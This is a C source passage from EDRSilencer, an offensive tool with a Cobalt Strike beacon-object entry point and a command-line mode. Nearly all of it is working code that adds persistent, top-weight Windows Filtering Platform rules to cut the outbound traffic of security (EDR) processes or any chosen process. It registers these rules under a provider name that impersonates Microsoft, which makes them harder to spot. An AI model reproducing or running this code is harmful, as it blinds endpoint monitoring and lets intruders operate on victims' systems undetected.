                            filter.providerKey = &providerGuid;
                        }
                    }
                }

                // Add filter to both IPv4 and IPv6 layers
                result = fwp->FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
                if (result == ERROR_SUCCESS) {
                    internal_printf("    Added WFP filter for \"%S\" (Filter id: %d, IPv4 layer).\n", fullPath, filterId);
                }
                else {
                    internal_printf("    [-] Failed to add filter in IPv4 layer with error code: 0x%x.\n", result);
                }

                filter.layerKey = GUID_FWPM_LAYER_ALE_AUTH_CONNECT_V6;
                result = fwp->FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
                if (result == ERROR_SUCCESS) {
                    internal_printf("    Added WFP filter for \"%S\" (Filter id: %d, IPv6 layer).\n", fullPath, filterId);
                }
                else {
                    internal_printf("    [-] Failed to add filter in IPv6 layer with error code: 0x%x.\n", result);
                }

                FreeAppId(appId);
                CloseHandle(hProcess);

            }
            else {
                internal_printf("    [-] Could not open process \"%s\" with error code: 0x%x.\n", pe32.szExeFile, GetLastError());
            }
        }


        bFind = Process32NextW(hProcessSnap, &pe32);
    }

    if (!isEdrDetected) {
        internal_printf("[-] No EDR process was detected. Please double check the edrProcess list or add the filter manually using 'block' command.\n");
    }
    CloseHandle(hProcessSnap);
    fwp->FwpmEngineClose0(hEngine);
    return;
}

// Add block WFP filter to user-defined process
void BlockProcessTraffic(char* fullPath, PFWPUCLNT_FUNCTION fwp, WCHAR* filterName, WCHAR* providerName, WCHAR* providerDescription) {
    DWORD result = 0;
    HANDLE hEngine = NULL;
    WCHAR wFullPath[MAX_PATH] = { 0 };
    DWORD size = MAX_PATH;
    FWPM_FILTER_CONDITION0 cond = { 0 };
    FWPM_FILTER0 filter = { 0 };
    FWPM_PROVIDER0 provider = { 0 };
    GUID providerGuid = { 0 };
    FWP_BYTE_BLOB* appId = NULL;
    UINT64 filterId = 0;
    ErrorCode errorCode = CUSTOM_SUCCESS;

    // d78e1e87-8644-4ea5-9437-d809ecefc971
    const GUID GUID_FWPM_CONDITION_ALE_APP_ID = {
        0xd78e1e87,
        0x8644,
        0x4ea5,
        {0x94, 0x37, 0xd8, 0x09, 0xec, 0xef, 0xc9, 0x71 }
    };

    // c38d57d1-05a7-4c33-904f-7fbceee60e82
    const GUID GUID_FWPM_LAYER_ALE_AUTH_CONNECT_V4 = {
        0xc38d57d1,
        0x05a7,
        0x4c33,
        {0x90, 0x4f, 0x7f, 0xbc, 0xee, 0xe6, 0x0e, 0x82}
    };

    // 4a72393b-319f-44bc-84c3-ba54dcb3b6b4
    const GUID GUID_FWPM_LAYER_ALE_AUTH_CONNECT_V6 = {
        0x4a72393b,
        0x319f,
        0x44bc,
        {0x84, 0xc3, 0xba, 0x54, 0xdc, 0xb3, 0xb6, 0xb4}
    };

    result = fwp->FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        internal_printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
        return;
    }
    CharArrayToWCharArray(fullPath, wFullPath, sizeof(wFullPath) / sizeof(wFullPath[0]));
    errorCode = CustomFwpmGetAppIdFromFileName0(wFullPath, &appId);
    if (errorCode != CUSTOM_SUCCESS) {
        switch (errorCode) {
        case CUSTOM_FILE_NOT_FOUND:
            internal_printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The file path cannot be found.\n", wFullPath);
            break;
        case CUSTOM_MEMORY_ALLOCATION_ERROR:
            internal_printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Error occurred in allocating memory for appId.\n", wFullPath);
            break;
        case CUSTOM_NULL_INPUT:
            internal_printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Please check your input.\n", wFullPath);
            break;
        case CUSTOM_DRIVE_NAME_NOT_FOUND:
            internal_printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The drive name cannot be found.\n", wFullPath);
            break;
        case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:
            internal_printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Failed to convert drive name to DOS device name.\n", wFullPath);
            break;
        default:
            break;
        }
        return;
    }

    // Setting up WFP filter and condition
    filter.displayData.name = filterName;
    filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
    filter.layerKey = GUID_FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    filter.action.type = FWP_ACTION_BLOCK;
    UINT64 weightValue = 0xFFFFFFFFFFFFFFFF;
    filter.weight.type = FWP_UINT64;
    filter.weight.uint64 = &weightValue;
    cond.fieldKey = GUID_FWPM_CONDITION_ALE_APP_ID;
    cond.matchType = FWP_MATCH_EQUAL;
    cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    cond.conditionValue.byteBlob = appId;
    filter.filterCondition = &cond;
    filter.numFilterConditions = 1;

    // Add WFP provider for the filter
    if (GetProviderGUIDByDescription(providerDescription, &providerGuid, fwp)) {
        filter.providerKey = &providerGuid;
    }
    else {
        provider.displayData.name = providerName;
        provider.displayData.description = providerDescription;
        provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
        result = fwp->FwpmProviderAdd0(hEngine, &provider, NULL);
        if (result != ERROR_SUCCESS) {
            internal_printf("[-] FwpmProviderAdd0 failed with error code: 0x%x.\n", result);
        }
        else {
            if (GetProviderGUIDByDescription(providerDescription, &providerGuid, fwp)) {
                filter.providerKey = &providerGuid;
            }
        }
    }

    // Add filter to both IPv4 and IPv6 layers
    result = fwp->FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
    if (result == ERROR_SUCCESS) {
        internal_printf("Added WFP filter for \"%s\" (Filter id: %d, IPv4 layer).\n", fullPath, filterId);
    }
    else {
        internal_printf("[-] Failed to add filter in IPv4 layer with error code: 0x%x.\n", result);
    }

    filter.layerKey = GUID_FWPM_LAYER_ALE_AUTH_CONNECT_V6;
    result = fwp->FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
    if (result == ERROR_SUCCESS) {
        internal_printf("Added WFP filter for \"%s\" (Filter id: %d, IPv6 layer).\n", fullPath, filterId);
    }
    else {
        internal_printf("[-] Failed to add filter in IPv6 layer with error code: 0x%x.\n", result);
    }

    FreeAppId(appId);
    fwp->FwpmEngineClose0(hEngine);
    return;
}

// Remove all WFP filters previously created
void UnblockAllWfpFilters(PFWPUCLNT_FUNCTION fwp, WCHAR* filterName, WCHAR* providerDescription) {
    HANDLE hEngine = NULL;
    DWORD result = 0;
    HANDLE enumHandle = NULL;
    FWPM_FILTER0** filters = NULL;
    GUID providerGuid = { 0 };
    UINT32 numFilters = 0;
    BOOL foundFilter = FALSE;
    result = fwp->FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        internal_printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
        return;
    }

    result = fwp->FwpmFilterCreateEnumHandle0(hEngine, NULL, &enumHandle);
    if (result != ERROR_SUCCESS) {
        internal_printf("[-] FwpmFilterCreateEnumHandle0 failed with error code: 0x%x.\n", result);
        return;
    }

    while (TRUE) {
        result = fwp->FwpmFilterEnum0(hEngine, enumHandle, 1, &filters, &numFilters);

        if (result != ERROR_SUCCESS) {
            internal_printf("[-] FwpmFilterEnum0 failed with error code: 0x%x.\n", result);
            fwp->FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
            fwp->FwpmEngineClose0(hEngine);
            return;
        }

        if (numFilters == 0) {
            break;
        }

        FWPM_DISPLAY_DATA0* data = &filters[0]->displayData;
        WCHAR* currentFilterName = data->name;
        if (_wcscmp(currentFilterName, filterName) == 0) {
            foundFilter = TRUE;
            UINT64 filterId = filters[0]->filterId;
            result = fwp->FwpmFilterDeleteById0(hEngine, filterId);
            if (result == ERROR_SUCCESS) {
                internal_printf("Deleted filter id: %llu.\n", filterId);
            }
            else {
                internal_printf("[-] Failed to delete filter id: %llu with error code: 0x%x.\n", filterId, result);
            }
        }
    }

    if (GetProviderGUIDByDescription(providerDescription, &providerGuid, fwp)) {
        result = fwp->FwpmProviderDeleteByKey0(hEngine, &providerGuid);
        if (result != ERROR_SUCCESS) {
            if (result != FWP_E_IN_USE) {
                internal_printf("[-] FwpmProviderDeleteByKey0 failed with error code: 0x%x.\n", result);
            }
        }
        else {
            internal_printf("Deleted custom WFP provider.\n");
        }
    }

    if (!foundFilter) {
        internal_printf("[-] Unable to find any WFP filter created by this tool.\n");
    }
    fwp->FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
    fwp->FwpmEngineClose0(hEngine);
}

// Remove WFP filter based on filter id
void UnblockWfpFilter(UINT64 filterId, PFWPUCLNT_FUNCTION fwp, WCHAR* providerDescription) {
    HANDLE hEngine = NULL;
    DWORD result = 0;
    GUID providerGuid = { 0 };

    result = fwp->FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        internal_printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
        return;
    }

    result = fwp->FwpmFilterDeleteById0(hEngine, filterId);

    if (result == ERROR_SUCCESS) {
        internal_printf("Deleted filter id: %llu.\n", filterId);
    }
    else if (result == FWP_E_FILTER_NOT_FOUND) {
        internal_printf("[-] The filter does not exist.\n");
    }
    else {
        internal_printf("[-] Failed to delete filter id: %llu with error code: 0x%x.\n", filterId, result);
    }

    if (GetProviderGUIDByDescription(providerDescription, &providerGuid, fwp)) {
        result = fwp->FwpmProviderDeleteByKey0(hEngine, &providerGuid);
        if (result != ERROR_SUCCESS) {
            if (result != FWP_E_IN_USE) {
                internal_printf("[-] FwpmProviderDeleteByKey0 failed with error code: 0x%x.\n", result);
            }
        }
        else {
            internal_printf("Deleted custom WFP provider.\n");
        }
    }

    fwp->FwpmEngineClose0(hEngine);
}


#ifdef BOF
void go(char* args, int len)
{
    CHAR* flag;
    CHAR* fullPath;
    DWORD filterId = 0;
    datap parser;
    if (!bofstart()) return;

    BeaconDataParse(&parser, args, len);

    flag = BeaconDataExtract(&parser, NULL);
    fullPath = BeaconDataExtract(&parser, NULL);
    filterId = BeaconDataInt(&parser);

    if (CheckProcessIntegrityLevel()) {
        //init
        FWPUCLNT_FUNCTION fwp = { 0 };
        InitAPI(&fwp);

        // The "unblockall" feature will delete all filters that are based on the custom filter name
        WCHAR* filterName = L"Secure Outbound Filter";
        WCHAR* providerName = L"Microsoft Corporation";
        // provider description has to be unique because:
        // - avoid problem in adding persistent WFP filter to a provider (error 0x80320016)
        // - avoid removing legitimate WFP provider
        WCHAR* providerDescription = L"Microsoft Windows WFP Built-in Secure provider.";

        if (StringCompareIA(flag, "blockedr") == 0)
        {
            BlockEdrProcessTraffic(&fwp, filterName, providerName, providerDescription);
        }

        if (StringCompareIA(flag, "block") == 0)
        {
            BlockProcessTraffic(fullPath, &fwp, filterName, providerName, providerDescription);
        }

        if (StringCompareIA(flag, "unblockall") == 0)
        {
            UnblockAllWfpFilters(&fwp, filterName, providerDescription);
        }

        if (StringCompareIA(flag, "unblock") == 0)
        {
            UnblockWfpFilter(filterId, &fwp, providerDescription);
        }
    }

    internal_printf("[i] Done\n");
    printoutput(TRUE);
}

#else

void PrintHelp() {
    internal_printf("Usage: EDRSilencer.exe <blockedr/block/unblockall/unblock>\n");
    internal_printf("Version: 1.4\n");
    internal_printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of all detected EDR processes:\n");
    internal_printf("  EDRSilencer.exe blockedr\n\n");
    internal_printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of a specific process (full path is required):\n");
    internal_printf("  EDRSilencer.exe block \"C:\\Windows\\System32\\curl.exe\"\n\n");
    internal_printf("- Remove all WFP filters applied by this tool:\n");
    internal_printf("  EDRSilencer.exe unblockall\n\n");
    internal_printf("- Remove a specific WFP filter based on filter id:\n");
    internal_printf("  EDRSilencer.exe unblock <filter id>");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        PrintHelp();
        return 1;
    }

    if (StringCompareIA(argv[1], "-h") == 0 || StringCompareIA(argv[1], "--help") == 0) {
        PrintHelp();
        return 1;
    }

    if (!CheckProcessIntegrityLevel()) {
        return 1;
    }
    //init
    FWPUCLNT_FUNCTION fwp = { 0 };
    InitAPI(&fwp);

    // The "unblockall" feature will delete all filters that are based on the custom filter name
    WCHAR* filterName = L"Custom Outbound Filter";
    WCHAR* providerName = L"Microsoft Corporation";
    // provider description has to be unique because:
    // - avoid problem in adding persistent WFP filter to a provider (error 0x80320016)
    // - avoid removing legitimate WFP provider
    WCHAR* providerDescription = L"Microsoft Windows WFP Built-in custom provider.";

    if (StringCompareIA(argv[1], "blockedr") == 0) {
        BlockEdrProcessTraffic(&fwp, filterName, providerName, providerDescription);
    }
    else if (StringCompareIA(argv[1], "block") == 0) {
        if (argc < 3) {
            internal_printf("[-] Missing second argument. Please provide the full path of the process to block.\n");
            return 1;
        }
        BlockProcessTraffic(argv[2], &fwp, filterName, providerName, providerDescription);
    }
    else if (StringCompareIA(argv[1], "unblockall") == 0) {
        UnblockAllWfpFilters(&fwp, filterName, providerDescription);
    }
    else if (StringCompareIA(argv[1], "unblock") == 0) {
        if (argc < 3) {
            internal_printf("[-] Missing argument for 'unblock' command. Please provide the filter id.\n");
            return 1;
        }
        char* endptr;
        errno = 0;

        UINT64 filterId = strtoull(argv[2], &endptr, 10);

        if (errno != 0) {
            internal_printf("[-] strtoull failed with error code: 0x%x.\n", errno);
            return 1;
        }

        if (endptr == argv[2]) {
            internal_printf("[-] Please provide filter id in digits.\n");
            return 1;
        }
        UnblockWfpFilter(filterId, &fwp, providerDescription);
    }
    else {
        internal_printf("[-] Invalid argument: \"%s\".\n", argv[1]);
        return 1;
    }
    return 0;
}

#endif